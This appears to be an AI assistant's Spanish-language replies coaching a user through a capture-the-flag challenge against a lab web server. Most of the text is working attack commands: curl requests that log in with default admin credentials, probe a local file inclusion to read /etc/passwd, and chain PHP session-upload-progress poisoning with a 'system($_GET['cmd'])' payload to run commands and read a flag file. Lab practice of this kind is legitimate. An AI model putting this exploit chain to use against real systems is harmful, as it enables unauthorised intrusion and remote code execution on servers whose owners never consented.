Vas bien 👍 pero hay algo importante que está pasando y por eso no estás viendo nada en las respuestas.

El archivo phpinfo ya nos dio la pista clave del servidor que corre Apache HTTP Server con PHP:

DOCUMENT_ROOT = /var/www/html

usuario del servidor: www-data

display_errors = Off

⚠️ Cuando display_errors está en Off, muchos errores o includes fallidos no muestran nada, por eso tus curl parecen vacíos.

🔎 Problema real que tienes ahora

Tu endpoint:

/challenger/home.php


cuando lo visitas:

/home.php → 302 → index.html


Eso significa que home.php probablemente exige sesión válida.

Por eso tus pruebas de:

?file=
?page=
?view=


no devuelven nada.

🧠 Lo que realmente debes hacer

Primero loguearte y mantener la cookie.

1️⃣ Login guardando sesión
curl -c cookie.txt \
-d "usuario=admin&contraseña=admin" \
http://192.168.56.102/challenger/envia.php


Luego revisa:

cat cookie.txt


Debes ver algo como:

PHPSESSID=xxxxx

2️⃣ Acceder a home.php con sesión
curl -b cookie.txt \
http://192.168.56.102/challenger/home.php


Si funciona ya no redireccionará.

3️⃣ Probar LFI correctamente
curl -b cookie.txt \
"http://192.168.56.102/challenger/home.php?file=/etc/passwd"


o

curl -b cookie.txt \
"http://192.168.56.102/challenger/home.php?page=/etc/passwd"

4️⃣ Si eso no funciona (muy probable)

En muchos retos el parámetro es otro, prueba rápido:

?archivo=
?include=
?path=
?doc=
?template=
?module=


ejemplo:

curl -b cookie.txt \
"http://192.168.56.102/challenger/home.php?archivo=/etc/passwd"

🔥 Algo que casi nadie nota en tu phpinfo

El hostname que aparece:

challenger.larm182


Eso sugiere virtual host en Apache.

Agrega esto a tu /etc/hosts:

sudo nano /etc/hosts


y agrega:

192.168.56.102 challenger.larm182


Luego prueba:

http://challenger.larm182/challenger


Muchas veces el reto solo funciona con el hostname correcto.

Vas muy cerca, pero hay 3 errores clave en lo que estás haciendo. Te los explico y luego te doy exactamente qué ejecutar.

⚠️ Problema 1 — Estás usando una sesión falsa

Usaste:

sess_abcd1234


Eso no existe en el servidor.

Debes usar tu sesión real:

PHPSESSID=tj0cauaf1cmlu0aftjhiuc4pj2


Entonces el archivo de sesión real es:

/var/lib/php/sessions/sess_tj0cauaf1cmlu0aftjhiuc4pj2

⚠️ Problema 2 — El payload no se está guardando en la sesión

Tu comando:

--form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php system("id"); ?>'


está bien, pero necesitas mantener la misma sesión.

Hazlo así.

⚡ PASO 1 — Inyectar PHP en la sesión

Ejecuta EXACTAMENTE esto:

curl -b cookie.txt \
-F "PHP_SESSION_UPLOAD_PROGRESS=<?php system(\$_GET['cmd']); ?>" \
-F "file=@/etc/hosts" \
http://192.168.56.102/challenger/envia.php


Esto guardará el payload en:

/var/lib/php/sessions/sess_tj0cauaf1cmlu0aftjhiuc4pj2

⚡ PASO 2 — Incluir la sesión (LFI)

Ahora ejecuta:

curl -b cookie.txt \
"http://192.168.56.102/challenger/home.php?file=/var/lib/php/sessions/sess_tj0cauaf1cmlu0aftjhiuc4pj2&cmd=id"


Deberías ver algo como:

uid=33(www-data) gid=33(www-data)

⚠️ Problema 3 — Espacios en curl

Tus errores:

ocurren porque pusiste espacios:

cmd=cat /var/www/html/flag.txt


Debes codificarlos:

%20
